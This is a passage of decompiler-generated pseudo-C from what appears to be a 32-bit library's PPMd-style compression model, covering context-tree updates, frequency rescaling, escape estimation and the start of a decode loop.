    sub_1008B50D(v10, v8);
    this[3] = (this[3] + 11) >> 3;
  }
  return this;
}
// 1018443C: using guessed type int dword_1018443C;
// 1018570C: using guessed type int dword_1018570C;

//----- (1008BB1B) --------------------------------------------------------
_DWORD *__thiscall sub_1008BB1B(_DWORD *this, int a2)
{
  _BYTE *v3; // eax
  unsigned int v5; // eax
  unsigned int v6; // esi

  if ( *(_BYTE *)this )
  {
    v5 = this[1];
    v6 = v5 + 6 * *(unsigned __int8 *)this;
    if ( v6 >= v5 )
    {
      do
      {
        if ( *(_DWORD *)(v6 + 2) < (unsigned int)dword_1018443C || a2 >= dword_1018570C )
          *(_DWORD *)(v6 + 2) = 0;
        else
          *(_DWORD *)(v6 + 2) = sub_1008BB1B(a2 + 1);
        v6 -= 6;
      }
      while ( v6 >= this[1] );
    }
  }
  else
  {
    if ( this[1] < (unsigned int)dword_1018443C || a2 >= dword_1018570C )
      this[1] = 0;
    else
      this[1] = sub_1008BB1B(a2 + 1);
    if ( !this[1] )
    {
      v3 = (_BYTE *)this[2];
      if ( !*v3 || v3[1] == 0xFF )
      {
        sub_1008B50D(1, this);
        return 0;
      }
    }
  }
  return this;
}
// 1018443C: using guessed type int dword_1018443C;
// 1018570C: using guessed type int dword_1018570C;

//----- (1008BBC2) --------------------------------------------------------
char *__cdecl sub_1008BBC2(unsigned __int8 *a1, unsigned __int8 *a2, int a3)
{
  unsigned __int8 *v3; // esi
  unsigned __int8 *v4; // edi
  _DWORD *v6; // eax
  unsigned __int8 v7; // al
  int v8; // edi
  char *result; // eax
  int v10; // eax
  int v11; // eax

  v3 = (unsigned __int8 *)dword_101855F0;
  v4 = (unsigned __int8 *)dword_101855F0;
  for ( dword_10186390 = (int)dword_1018532C; v4 != a1; v4 = (unsigned __int8 *)*((_DWORD *)v4 + 2) )
  {
    if ( (*v4)-- == 1 )
    {
      v6 = (_DWORD *)*((_DWORD *)v4 + 1);
      v4[1] = (v4[1] & 0x10) + 8 * (*(_BYTE *)v6 >= 0x40u);
      *((_WORD *)v4 + 1) = *(_WORD *)v6;
      *((_DWORD *)v4 + 1) = *(_DWORD *)((char *)v6 + 2);
      sub_1008B536(v6);
      v4[3] = (v4[3] + 11) >> 3;
    }
    else
    {
      sub_1008B927(0, v4, (*v4 + 3) >> 1);
    }
  }
  while ( v4 != a2 )
  {
    v7 = *v4;
    if ( *v4 )
    {
      *((_WORD *)v4 + 1) += 4;
      if ( *((unsigned __int16 *)v4 + 1) > 4 * v7 + 128 )
        sub_1008B927(1, v4, (v7 + 2) >> 1);
    }
    else
    {
      v4[3] -= v4[3] >> 1;
    }
    v4 = (unsigned __int8 *)*((_DWORD *)v4 + 2);
  }
  v8 = dword_10185568;
  if ( dword_10185568 > 2 )
  {
    dword_101855F0 = a3;
    result = (char *)((dword_101939F0 & 1) == 0);
    dword_10185438 += (int)result;
    return result;
  }
  if ( dword_10185568 == 2 )
  {
    while ( 1 )
    {
      v10 = *((_DWORD *)v3 + 2);
      if ( !v10 )
        break;
      v3 = (unsigned __int8 *)*((_DWORD *)v3 + 2);
      dword_101855F0 = v10;
    }
    sub_1008BB1B(v3, 0);
    dword_10185568 = 3;
  }
  else
  {
    if ( !dword_10185568 || sub_1008B110() < (unsigned int)dword_10130320 >> 1 )
    {
      result = sub_1008B774(dword_1018570C, v8);
      byte_101842E1 = 0;
      byte_1018443B = -1;
      return result;
    }
    while ( 1 )
    {
      v11 = *((_DWORD *)v3 + 2);
      if ( !v11 )
        break;
      v3 = (unsigned __int8 *)*((_DWORD *)v3 + 2);
      dword_101855F0 = v11;
    }
    while ( 1 )
    {
      sub_1008B9B7(v3, 0);
      sub_1008B5F9();
      if ( sub_1008B110() <= 3 * ((unsigned int)dword_10130320 >> 2) )
        break;
      v3 = (unsigned __int8 *)dword_101855F0;
    }
  }
  result = (char *)dword_1018570C;
  dword_10185438 = 0;
  dword_101855F4 = dword_1018570C;
  return result;
}
// 10130320: using guessed type int dword_10130320;
// 101842E1: using guessed type char byte_101842E1;
// 1018443B: using guessed type char byte_1018443B;
// 10185438: using guessed type int dword_10185438;
// 10185568: using guessed type int dword_10185568;
// 101855F0: using guessed type int dword_101855F0;
// 101855F4: using guessed type int dword_101855F4;
// 1018570C: using guessed type int dword_1018570C;
// 10186390: using guessed type int dword_10186390;
// 101939F0: using guessed type int dword_101939F0;

//----- (1008BD41) --------------------------------------------------------
int __usercall sub_1008BD41@<eax>(int a1@<eax>, int a2@<ecx>)
{
  unsigned int v2; // ebx
  int i; // esi
  bool v4; // zf
  int v5; // ecx
  char v6; // dl
  int v7; // edi
  int v8; // eax
  unsigned __int8 v9; // dl
  unsigned __int8 v10; // al
  int *v11; // eax
  unsigned __int8 *v13; // eax
  int v14; // [esp+Ch] [ebp-4Ch] BYREF
  char v15; // [esp+10h] [ebp-48h] BYREF
  int v16; // [esp+4Ch] [ebp-Ch]
  int *v17; // [esp+50h] [ebp-8h]
  char v18; // [esp+56h] [ebp-2h]
  unsigned __int8 v19; // [esp+57h] [ebp-1h]

  ++dword_101855F4;
  v2 = dword_10186390;
  i = a2;
  v4 = a2 == 0;
  v5 = dword_10185434;
  v6 = *(_BYTE *)dword_10185434;
  v7 = a1;
  v16 = a1;
  v18 = v6;
  v14 = dword_10185434;
  v17 = (int *)&v15;
  *(_DWORD *)(dword_10185434 + 2) = dword_10186390;
  if ( v4 )
    goto LABEL_3;
  v7 = *(_DWORD *)(a1 + 8);
  while ( !*(_DWORD *)(i + 2) )
  {
    v11 = v17++;
    ++dword_101855F4;
    v6 = v18;
    *v11 = i;
    *(_DWORD *)(i + 2) = v2;
LABEL_3:
    v8 = *(_DWORD *)(v7 + 8);
    if ( !v8 )
    {
      if ( dword_10185568 > 2 )
      {
        do
LABEL_15:
          *(_DWORD *)(*--v17 + 2) = v7;
        while ( v17 != &v14 );
        dword_10186390 = (int)dword_1018532C + 1;
        dword_101855F4 = 1;
      }
      return v7;
    }
    v7 = *(_DWORD *)(v7 + 8);
    if ( *(_BYTE *)v8 )
    {
      for ( i = *(_DWORD *)(v8 + 4); *(_BYTE *)i != v6; i += 6 )
        ;
      v9 = *(_BYTE *)(i + 1);
      v10 = 2 * (v9 < 0x73u);
      v19 = v10;
      *(_BYTE *)(i + 1) = v10 + v9;
      *(_WORD *)(v7 + 2) += v10;
    }
    else
    {
      i = v8 + 2;
      *(_BYTE *)(v7 + 3) = *(_BYTE *)(v8 + 3) + (*(_BYTE *)(v8 + 3) < 0x20u);
    }
  }
  if ( dword_10185568 > 2 )
  {
    v7 = *(_DWORD *)(i + 2);
    goto LABEL_15;
  }
  if ( *(_DWORD *)(i + 2) <= v2 )
  {
    v17 = (int *)v5;
    dword_10185434 = i;
    v13 = sub_1008C03C((unsigned __int8 *)v7, 0, 0);
    v5 = (int)v17;
    *(_DWORD *)(i + 2) = v13;
    dword_10185434 = v5;
  }
  if ( dword_101855F4 == 1 && v16 == dword_101855F0 )
  {
    *(_DWORD *)(v5 + 2) = *(_DWORD *)(i + 2);
    dword_10186390 = v2 - 1;
  }
  return *(_DWORD *)(i + 2);
}
// 10185434: using guessed type int dword_10185434;
// 10185568: using guessed type int dword_10185568;
// 101855F0: using guessed type int dword_101855F0;
// 101855F4: using guessed type int dword_101855F4;
// 10186390: using guessed type int dword_10186390;

//----- (1008BE77) --------------------------------------------------------
char __usercall sub_1008BE77@<al>(unsigned __int8 *a1@<edi>)
{
  int i; // eax
  __int16 v2; // dx
  int v3; // esi
  _WORD *v4; // ebx
  unsigned int v5; // esi
  unsigned int v6; // ecx
  int v7; // ecx
  unsigned int v8; // ecx
  int v9; // ecx
  _BYTE *v10; // eax
  unsigned int v11; // esi
  int v12; // ecx
  bool v13; // zf
  unsigned __int8 v14; // al
  int v15; // eax
  int v16; // eax
  _DWORD *v17; // eax
  unsigned __int8 v18; // cl
  int v19; // edx
  _BYTE *v20; // esi
  __int16 v22; // [esp+8h] [ebp-14h]
  __int16 v23; // [esp+8h] [ebp-14h]
  int v24; // [esp+Ah] [ebp-12h]
  int v25; // [esp+Ah] [ebp-12h]
  int v26; // [esp+10h] [ebp-Ch]
  unsigned int v27; // [esp+10h] [ebp-Ch]
  BOOL v28; // [esp+14h] [ebp-8h]
  int v29; // [esp+18h] [ebp-4h]

  v29 = *a1;
  for ( i = dword_10185434; i != *((_DWORD *)a1 + 1); i -= 6 )
  {
    v2 = *(_WORD *)i;
    v3 = *(_DWORD *)(i + 2);
    *(_WORD *)i = *(_WORD *)(i - 6);
    *(_DWORD *)(i + 2) = *(_DWORD *)(i - 4);
    *(_DWORD *)(i - 4) = v3;
    *(_WORD *)(i - 6) = v2;
  }
  *(_BYTE *)(i + 1) += 4;
  v4 = a1 + 2;
  *((_WORD *)a1 + 1) += 4;
  v5 = *((unsigned __int16 *)a1 + 1) - *(unsigned __int8 *)(i + 1);
  v28 = dword_101855F4 || dword_10185568 > 2;
  v6 = (v28 + (unsigned int)*(unsigned __int8 *)(i + 1)) >> 1;
  *(_BYTE *)(i + 1) = v6;
  *v4 = (unsigned __int8)v6;
  do
  {
    v7 = *(unsigned __int8 *)(i + 7);
    i += 6;
    v5 -= v7;
    v8 = (unsigned int)(v28 + v7) >> 1;
    *(_BYTE *)(i + 1) = v8;
    *v4 += (unsigned __int8)v8;
    if ( *(_BYTE *)(i + 1) > *(_BYTE *)(i - 5) )
    {
      v22 = *(_WORD *)i;
      v9 = i;
      v24 = *(_DWORD *)(i + 2);
      do
      {
        v26 = v9 - 6;
        *(_WORD *)v9 = *(_WORD *)(v9 - 6);
        *(_DWORD *)(v9 + 2) = *(_DWORD *)(v9 - 4);
        v9 = v26;
      }
      while ( HIBYTE(v22) > *(_BYTE *)(v26 - 5) );
      *(_WORD *)v26 = v22;
      *(_DWORD *)(v26 + 2) = v24;
    }
    --v29;
  }
  while ( v29 );
  v10 = (_BYTE *)(i + 1);
  if ( *v10 )
    goto LABEL_23;
  do
  {
    ++v29;
    v10 -= 6;
  }
  while ( !*v10 );
  v11 = v29 + v5;
  v12 = (*a1 + 2) >> 1;
  v14 = *a1 - v29;
  v13 = *a1 == (unsigned __int8)v29;
  v27 = v11;
  *a1 = v14;
  if ( !v13 )
  {
    v17 = sub_1008B49E(v12, (v14 + 2) >> 1, *((_DWORD **)a1 + 1));
    a1[1] &= ~8u;
    v18 = a1[1];
    v19 = *a1;
    v20 = v17;
    *((_DWORD *)a1 + 1) = v17;
    a1[1] = v18 | (8 * (*(_BYTE *)v17 >= 0x40u));
    do
    {
      v20 += 6;
      a1[1] |= 8 * (*v20 >= 0x40u);
      --v19;
    }
    while ( v19 );
    v5 = v27;
LABEL_23:
    v16 = *((_DWORD *)a1 + 1);
    *v4 += v5 - (v5 >> 1);
    a1[1] |= 4u;
    dword_10185434 = v16;
    return v16;
  }
  v15 = *((_DWORD *)a1 + 1);
  LOBYTE(v23) = *(_WORD *)v15;
  v25 = *(_DWORD *)(v15 + 2);
  HIBYTE(v23) = (v11 + 2 * (unsigned __int8)HIBYTE(*(_WORD *)v15) - 1) / v11;
  if ( HIBYTE(v23) > 0x29u )
    HIBYTE(v23) = 41;
  sub_1008B50D(v12, *((_DWORD **)a1 + 1));
  *v4 = v23;
  *((_DWORD *)a1 + 1) = v25;
  LOBYTE(v16) = (a1[1] & 0x10) + 8 * ((unsigned __int8)v23 >= 0x40u);
  a1[1] = v16;
  dword_10185434 = (int)(a1 + 2);
  return v16;
}
// 10185434: using guessed type int dword_10185434;
// 10185568: using guessed type int dword_10185568;
// 101855F4: using guessed type int dword_101855F4;

//----- (1008C03C) --------------------------------------------------------
unsigned __int8 *__userpurge sub_1008C03C@<eax>(unsigned __int8 *a1@<eax>, unsigned __int8 *i@<ecx>, int a3)
{
  unsigned __int8 *v3; // esi
  unsigned __int8 *v4; // edi
  int *v5; // ebx
  bool v6; // zf
  unsigned __int8 v7; // al
  unsigned __int8 *result; // eax
  unsigned __int8 v9; // cl
  _BYTE *v10; // eax
  char v11; // dl
  unsigned int v12; // eax
  unsigned int v13; // ecx
  unsigned __int8 v14; // al
  int v15; // ecx
  int v16; // [esp+Ch] [ebp-50h] BYREF
  char v17; // [esp+10h] [ebp-4Ch] BYREF
  int v18; // [esp+4Ch] [ebp-10h]
  _BYTE *v19; // [esp+50h] [ebp-Ch]
  unsigned __int8 v20; // [esp+5Bh] [ebp-1h]

  v3 = a1;
  v4 = *(unsigned __int8 **)(dword_10185434 + 2);
  v5 = &v16;
  v20 = *(_BYTE *)dword_10185434;
  if ( !a3 )
  {
    v6 = *((_DWORD *)a1 + 2) == 0;
    v16 = dword_10185434;
    v5 = (int *)&v17;
    if ( v6 )
      goto LABEL_16;
  }
  if ( !i )
    goto LABEL_5;
  v3 = (unsigned __int8 *)*((_DWORD *)a1 + 2);
  while ( *(unsigned __int8 **)(i + 2) == v4 )
  {
    *v5++ = (int)i;
    if ( !*((_DWORD *)v3 + 2) )
      goto LABEL_14;
LABEL_5:
    v3 = (unsigned __int8 *)*((_DWORD *)v3 + 2);
    if ( *v3 )
    {
      for ( i = (unsigned __int8 *)*((_DWORD *)v3 + 1); *i != v20; i += 6 )
        ;
      v7 = i[1];
      i[1] = (v7 < 0x73u) + v7;
      *((_WORD *)v3 + 1) += v7 < 0x73u;
    }
    else
    {
      i = v3 + 2;
      v3[3] += v3[3] < 0x18u && **((_BYTE **)v3 + 2) == 0;
    }
  }
  v3 = *(unsigned __int8 **)(i + 2);
LABEL_14:
  if ( v5 == &v16 )
    return v3;
LABEL_16:
  v9 = *v4;
  v6 = *v3 == 0;
  LOBYTE(v18) = 0;
  BYTE2(v18) = v9;
  v19 = v4 + 1;
  BYTE1(v18) = (8 * (v9 >= 0x40u)) | (16 * (v20 >= 0x40u));
  if ( v6 )
  {
    v14 = v3[3];
  }
  else
  {
    v10 = (_BYTE *)*((_DWORD *)v3 + 1);
    if ( *v10 != v9 )
    {
      do
      {
        v11 = v10[6];
        v10 += 6;
      }
      while ( v11 != v9 );
    }
    v12 = (unsigned __int8)v10[1] - 1;
    v13 = *((unsigned __int16 *)v3 + 1) - *v3 - v12;
    if ( 2 * v12 > v13 )
      v12 = (v12 + 2 * v13 - 3) / v13;
    else
      LOBYTE(v12) = v13 < 5 * v12;
    v14 = v12 + 1;
  }
  HIBYTE(v18) = v14;
  while ( 1 )
  {
    result = (unsigned __int8 *)sub_1008B3EB();
    if ( !result )
      break;
    *(_DWORD *)result = v18;
    *((_DWORD *)result + 1) = v19;
    v15 = *--v5;
    *((_DWORD *)result + 2) = v3;
    *(_DWORD *)(v15 + 2) = result;
    v3 = result;
    if ( v5 == &v16 )
      return result;
  }
  return 0;
}
// 10185434: using guessed type int dword_10185434;

//----- (1008C188) --------------------------------------------------------
char *__cdecl sub_1008C188(unsigned __int8 *a1)
{
  unsigned __int8 *v1; // ebx
  int v2; // esi
  char v3; // dl
  int v4; // eax
  int v5; // edi
  int v6; // ecx
  unsigned __int8 v7; // dl
  __int16 v8; // cx
  char *result; // eax
  int v10; // ecx
  unsigned __int8 *v11; // eax
  unsigned int v12; // esi
  int v13; // eax
  _DWORD *v14; // eax
  int v15; // eax
  unsigned __int8 v16; // cl
  unsigned __int16 v17; // dx
  unsigned int v18; // ecx
  unsigned int v19; // eax
  __int16 v20; // dx
  int v21; // eax
  int v22; // [esp+Ch] [ebp-1Ch]
  __int16 v23; // [esp+10h] [ebp-18h]
  unsigned int v24; // [esp+10h] [ebp-18h]
  unsigned int v25; // [esp+14h] [ebp-14h]
  int v26; // [esp+18h] [ebp-10h]
  unsigned int v27; // [esp+18h] [ebp-10h]
  unsigned int v28; // [esp+1Ch] [ebp-Ch]
  unsigned int v29; // [esp+20h] [ebp-8h]
  unsigned __int8 v30; // [esp+27h] [ebp-1h]

  v1 = (unsigned __int8 *)dword_101855F0;
  v2 = dword_10185434;
  v3 = *(_BYTE *)dword_10185434;
  v29 = *(_DWORD *)(dword_10185434 + 2);
  v4 = *((_DWORD *)a1 + 2);
  v5 = 0;
  v25 = *(unsigned __int8 *)(dword_10185434 + 1);
  v30 = *(_BYTE *)dword_10185434;
  if ( v25 < 0x1F && v4 )
  {
    if ( *(_BYTE *)v4 )
    {
      v5 = *(_DWORD *)(v4 + 4);
      if ( *(_BYTE *)v5 != v3 )
      {
        do
          v5 += 6;
        while ( *(_BYTE *)v5 != v3 );
        if ( *(_BYTE *)(v5 + 1) >= *(_BYTE *)(v5 - 5) )
        {
          v23 = *(_WORD *)v5;
          v6 = v5 - 6;
          v26 = *(_DWORD *)(v5 + 2);
          *(_WORD *)v5 = *(_WORD *)(v5 - 6);
          *(_DWORD *)(v5 + 2) = *(_DWORD *)(v5 - 6 + 2);
          *(_WORD *)v6 = v23;
          *(_DWORD *)(v6 + 2) = v26;
          v5 -= 6;
        }
      }
      v7 = *(_BYTE *)(v5 + 1);
      v8 = 2 * (v7 < 0x73u);
      *(_BYTE *)(v5 + 1) = v8 + v7;
      *(_WORD *)(v4 + 2) += v8;
    }
    else
    {
      v5 = v4 + 2;
      *(_BYTE *)(v4 + 3) += *(_BYTE *)(v4 + 3) < 0x20u;
    }
  }
  if ( dword_101855F4 || !v29 )
  {
    v10 = dword_10186390;
    *(_BYTE *)dword_10186390 = v30;
    dword_10186390 = v10 + 1;
    v28 = v10 + 1;
    if ( v10 + 1 >= (unsigned int)dword_1018443C )
      return sub_1008BBC2(v1, a1, v29);
    if ( v29 )
    {
      if ( v29 >= dword_1018443C )
      {
LABEL_20:
        if ( !v29 )
          return sub_1008BBC2(v1, a1, v29);
        if ( --dword_101855F4 )
        {
          if ( dword_10185568 > 2 )
          {
            dword_101855F4 = 0;
            v28 = v29;
            dword_10186390 = (int)dword_1018532C;
          }
        }
        else
        {
          v28 = v29;
          dword_10186390 -= dword_101855F0 != (_DWORD)a1;
        }
        v12 = *((unsigned __int16 *)a1 + 1) - *a1 - v25;
        v27 = *a1;
        v24 = v12;
        if ( (unsigned __int8 *)dword_101855F0 != a1 )
        {
          do
          {
            v13 = *v1;
            v22 = v13;
            if ( *v1 )
            {
              if ( (v13 & 1) != 0 )
              {
                v14 = sub_1008B44C((unsigned int)(v13 + 1) >> 1, *((_DWORD **)v1 + 1));
                if ( !v14 )
                  return sub_1008BBC2(v1, a1, v29);
                v12 = v24;
                *((_DWORD *)v1 + 1) = v14;
                v13 = v22;
              }
              *((_WORD *)v1 + 1) += 3 * v13 + 1 < v27;
            }
            else
            {
              v15 = sub_1008B393(1);
              if ( !v15 )
                return sub_1008BBC2(v1, a1, v29);
              *(_WORD *)v15 = *((_WORD *)v1 + 1);
              *(_DWORD *)(v15 + 2) = *((_DWORD *)v1 + 1);
              *((_DWORD *)v1 + 1) = v15;
              v16 = *(_BYTE *)(v15 + 1);
              if ( v16 >= 0x1Eu )
                *(_BYTE *)(v15 + 1) = 120;
              else
                *(_BYTE *)(v15 + 1) = 2 * v16;
              *((_WORD *)v1 + 1) = dword_101855FC + *(unsigned __int8 *)(v15 + 1) + (v27 > 2);
            }
            v17 = *((_WORD *)v1 + 1);
            v18 = v12 + v17;
            v19 = 2 * v25 * (v17 + 6);
            if ( v19 >= 6 * v18 )
            {
              LOWORD(v18) = (12 * v18 < v19) + (15 * v18 < v19) + (9 * v18 < v19) + 4;
              v12 = v24;
              v20 = v18 + v17;
            }
            else
            {
              LOBYTE(v18) = (v19 >= 4 * v18) + (v18 < v19) + 1;
              v20 = v17 + 4;
            }
            v21 = *((_DWORD *)v1 + 1) + 6 * ++*v1;
            *((_WORD *)v1 + 1) = v20;
            *(_DWORD *)(v21 + 2) = v28;
            *(_BYTE *)v21 = v30;
            *(_BYTE *)(v21 + 1) = v18;
            v1[1] |= 8 * (v30 >= 0x40u);
            v1 = (unsigned __int8 *)*((_DWORD *)v1 + 2);
          }
          while ( v1 != a1 );
        }
        result = (char *)v29;
        goto LABEL_41;
      }
      v11 = sub_1008C03C(a1, (unsigned __int8 *)v5, 0);
    }
    else
    {
      v11 = (unsigned __int8 *)sub_1008BD41((int)a1, v5);
    }
    v29 = (unsigned int)v11;
    goto LABEL_20;
  }
  result = (char *)sub_1008C03C(a1, (unsigned __int8 *)v5, 1);
  *(_DWORD *)(v2 + 2) = result;
  if ( !result )
    return sub_1008BBC2(v1, a1, v29);
LABEL_41:
  dword_101855F0 = (int)result;
  return result;
}
// 1018443C: using guessed type int dword_1018443C;
// 10185434: using guessed type int dword_10185434;
// 10185568: using guessed type int dword_10185568;
// 101855F0: using guessed type int dword_101855F0;
// 101855F4: using guessed type int dword_101855F4;
// 101855FC: using guessed type int dword_101855FC;
// 10186390: using guessed type int dword_10186390;

//----- (1008C448) --------------------------------------------------------
int __thiscall sub_1008C448(int this, int a2)
{
  unsigned __int8 *v2; // eax
  unsigned __int8 v3; // dl
  unsigned __int16 *v4; // esi
  int v5; // eax
  int result; // eax
  unsigned __int16 v7; // dx
  unsigned __int16 v8; // cx
  int v9; // eax

  v2 = (unsigned __int8 *)(this + 2);
  v3 = *(_BYTE *)(this + 3);
  v4 = (unsigned __int16 *)((char *)&unk_10185710
                          + 128 * *((unsigned __int8 *)&dword_1018532C + v3 + 3)
                          + 2 * ((dword_1018543C >> 26) & 0x20)
                          + 2
                          * (unsigned __int8)(byte_101842E3
                                            + *(_BYTE *)(this + 1)
                                            + byte_10185440[**(unsigned __int8 **)(this + 8)]));
  if ( *(unsigned __int8 *)(this + 2) == a2 )
  {
    dword_10185700 = 0;
    *(_BYTE *)(this + 3) = v3 + (v3 < 0xC4u);
    dword_10185434 = this + 2;
    v5 = *v4;
    dword_10185704 = (unsigned __int16)v5;
    result = v5 - (((unsigned __int16)v5 + 32) >> 7) + 128;
    ++dword_1018543C;
    *v4 = result;
    byte_101842E3 = 1;
  }
  else
  {
    v7 = *v4;
    dword_10185700 = *v4;
    v8 = v7 - ((v7 + 32) >> 7);
    *v4 = v8;
    v9 = *v2;
    dword_101855FC = (unsigned __int8)byte_100FC3D0[v8 >> 10];
    byte_10185600[v9] = byte_101842E1;
    result = 0;
    dword_10185704 = 0x4000;
    byte_101842E3 = 0;
    byte_101842E2 = 0;
    dword_10185434 = 0;
  }
  return result;
}
// 101842E1: using guessed type char byte_101842E1;
// 101842E2: using guessed type char byte_101842E2;
// 101842E3: using guessed type char byte_101842E3;
// 10185434: using guessed type int dword_10185434;
// 1018543C: using guessed type int dword_1018543C;
// 101855FC: using guessed type int dword_101855FC;
// 10185700: using guessed type int dword_10185700;
// 10185704: using guessed type int dword_10185704;

//----- (1008C534) --------------------------------------------------------
char __usercall sub_1008C534@<al>(int a1@<eax>, int a2@<ecx>)
{
  bool v3; // cc
  __int16 v4; // dx
  int v5; // ecx
  int v6; // esi

  *(_BYTE *)(a1 + 1) += 4;
  *(_WORD *)(a2 + 2) += 4;
  v3 = *(_BYTE *)(a1 + 1) <= *(_BYTE *)(a1 - 5);
  dword_10185434 = a1;
  if ( !v3 )
  {
    v4 = *(_WORD *)a1;
    v5 = a1 - 6;
    *(_WORD *)a1 = *(_WORD *)(a1 - 6);
    v6 = *(_DWORD *)(a1 + 2);
    *(_DWORD *)(a1 + 2) = *(_DWORD *)(a1 - 6 + 2);
    *(_DWORD *)(v5 + 2) = v6;
    *(_WORD *)v5 = v4;
    v3 = *(_BYTE *)(a1 - 6 + 1) <= 0x7Cu;
    dword_10185434 = a1 - 6;
    if ( !v3 )
      LOBYTE(a1) = sub_1008BE77((unsigned __int8 *)a2);
  }
  return a1;
}
// 10185434: using guessed type int dword_10185434;

//----- (1008C57F) --------------------------------------------------------
char __userpurge sub_1008C57F@<al>(unsigned __int8 *a1@<eax>, int a2)
{
  unsigned __int8 *v3; // eax
  int v4; // ecx
  unsigned int v5; // esi
  unsigned __int8 v6; // cl
  bool v7; // cc
  int v8; // ecx
  int v9; // edx
  int v10; // edx
  char v11; // dl
  int v12; // ecx

  v3 = (unsigned __int8 *)*((_DWORD *)a1 + 1);
  v4 = *v3;
  v5 = *((unsigned __int16 *)a1 + 1);
  dword_10185708 = v5;
  if ( v4 == a2 )
  {
    v6 = v3[1];
    dword_10185704 = v6;
    v3[1] = v6 + 4;
    *((_WORD *)a1 + 1) += 4;
    dword_1018543C += 2 * (unsigned int)v6 >= v5;
    v7 = v3[1] <= 0x7Cu;
    byte_101842E3 = 2 * (unsigned int)v6 >= v5;
    dword_10185434 = (int)v3;
    if ( !v7 )
      LOBYTE(v3) = sub_1008BE77(a1);
    dword_10185700 = 0;
  }
  else
  {
    v8 = v3[1];
    v9 = *a1;
    byte_101842E3 = 0;
    do
    {
      v3 += 6;
      if ( *v3 == a2 )
      {
        v10 = v8 + v3[1];
        dword_10185700 = v8;
        dword_10185704 = v10;
        LOBYTE(v3) = sub_1008C534((int)v3, (int)a1);
        return (char)v3;
      }
      v8 += v3[1];
      --v9;
    }
    while ( v9 );
    if ( *((_DWORD *)a1 + 2) )
      v5 = dword_10185708;
    v11 = byte_101842E1;
    dword_10185434 = 0;
    dword_10185700 = v8;
    byte_10185600[*v3] = byte_101842E1;
    byte_101842E2 = *a1;
    v12 = (unsigned __int8)byte_101842E2;
    do
    {
      v3 -= 6;
      --v12;
      byte_10185600[*v3] = v11;
    }
    while ( v12 );
    dword_10185704 = v5;
  }
  return (char)v3;
}
// 101842E1: using guessed type char byte_101842E1;
// 101842E2: using guessed type char byte_101842E2;
// 101842E3: using guessed type char byte_101842E3;
// 10185434: using guessed type int dword_10185434;
// 1018543C: using guessed type int dword_1018543C;
// 10185700: using guessed type int dword_10185700;
// 10185704: using guessed type int dword_10185704;
// 10185708: using guessed type int dword_10185708;

//----- (1008C672) --------------------------------------------------------
int *__thiscall sub_1008C672(unsigned __int8 *this)
{
  int *result; // eax
  int v2; // esi

  if ( *this == 0xFF )
  {
    result = &dword_10186394;
    dword_10185708 = 1;
  }
  else
  {
    result = (int *)((char *)&unk_10184720
                   + 128 * (unsigned __int8)byte_10185332[*this]
                   + 8 * (2 * *this < (unsigned __int8)byte_101842E2 + **((unsigned __int8 **)this + 2))
                   + 4 * this[1]
                   + 4 * (*((unsigned __int16 *)this + 1) > 11 * (*this + 1))
                   - 384);
    v2 = *(unsigned __int16 *)result >> *((_BYTE *)result + 2);
    *(_WORD *)result -= v2;
    dword_10185708 = v2 + (v2 == 0);
  }
  return result;
}
// 101842E2: using guessed type char byte_101842E2;
// 10185708: using guessed type int dword_10185708;
// 10186394: using guessed type int dword_10186394;

//----- (1008C718) --------------------------------------------------------
char __stdcall sub_1008C718(unsigned __int8 *a1, int a2)
{
  int *v2; // eax
  char v3; // bl
  int v4; // ecx
  int *v5; // esi
  int v6; // eax
  unsigned __int8 *v7; // edx
  int v8; // edi
  bool v9; // zf
  int v10; // edi
  int v11; // ecx
  char result; // al
  int v13; // eax
  unsigned __int8 v14; // cl
  bool v15; // cc
  unsigned __int8 *i; // [esp+1Ch] [ebp+Ch]

  v2 = sub_1008C672(a1);
  v3 = byte_101842E1;
  v4 = *a1 - (unsigned __int8)byte_101842E2;
  v5 = v2;
  v6 = 0;
  v7 = (unsigned __int8 *)(*((_DWORD *)a1 + 1) - 6);
  while ( 1 )
  {
    do
    {
      v7 += 6;
      v8 = *v7;
    }
    while ( byte_10185600[v8] == v3 );
    v9 = v8 == a2;
    byte_10185600[v8] = v3;
    v10 = v7[1];
    if ( v9 )
      break;
    v6 += v10;
    if ( !--v4 )
    {
      v11 = v6 + dword_10185708;
      *(_WORD *)v5 += v6 + dword_10185708;
      dword_10185700 = v6;
      result = *a1;
      dword_10185708 = v11;
      dword_10185704 = v11;
      byte_101842E2 = result;
      return result;
    }
  }
  dword_10185700 = v6;
  v13 = v10 + v6;
  dword_10185704 = v13;
  for ( i = v7; --v4; v13 += i[1] )
  {
    do
      i += 6;
    while ( byte_10185600[*i] == v3 );
  }
  v14 = *((_BYTE *)v5 + 2);
  dword_10185708 += v13;
  if ( v14 < 7u )
  {
    v9 = (*((_BYTE *)v5 + 3))-- == 1;
    if ( v9 )
    {
      *(_WORD *)v5 *= 2;
      *((_BYTE *)v5 + 3) = 3 << v14;
      *((_BYTE *)v5 + 2) = v14 + 1;
    }
  }
  v7[1] += 4;
  *((_WORD *)a1 + 1) += 4;
  v15 = v7[1] <= 0x7Cu;
  dword_10185434 = (int)v7;
  if ( !v15 )
    sub_1008BE77(a1);
  result = dword_10185320;
  byte_101842E1 = v3 + 1;
  dword_1018543C = dword_10185320;
  return result;
}
// 101842E1: using guessed type char byte_101842E1;
// 101842E2: using guessed type char byte_101842E2;
// 10185320: using guessed type int dword_10185320;
// 10185434: using guessed type int dword_10185434;
// 1018543C: using guessed type int dword_1018543C;
// 10185700: using guessed type int dword_10185700;
// 10185704: using guessed type int dword_10185704;
// 10185708: using guessed type int dword_10185708;

//----- (1008C829) --------------------------------------------------------
int __stdcall sub_1008C829(_DWORD *a1, _DWORD *a2)
{
  unsigned int v2; // edi
  unsigned int i; // ebp
  unsigned __int8 *v4; // eax
  int v5; // ecx
  int v6; // ebx
  unsigned __int8 v7; // dl
  unsigned int v8; // edi
  unsigned int v9; // esi
  unsigned int v10; // ebp
  int v11; // eax
  unsigned __int8 *v12; // eax
  unsigned int v13; // eax
  int v14; // esi
  int result; // eax
  char v16; // [esp+13h] [ebp-5h]
  int v17; // [esp+14h] [ebp-4h]

  dword_10185324 = 0;
  dword_101855F8 = -1;
  sub_1008B774(14, 0);
  v2 = dword_10185324;
  for ( i = dword_101855F8; ; dword_101855F8 = i )
  {
    v4 = (unsigned __int8 *)dword_101855F0;
    v16 = *(_BYTE *)dword_101855F0;
    v5 = a2[4];
    v17 = dword_101855F0;
    if ( v5 < a2[2] )
    {
      v7 = *(_BYTE *)(v5 + *a2);
      a2[4] = v5 + 1;
      v6 = v7;
    }
    else
    {
      v6 = -1;
    }
    if ( v16 )
    {
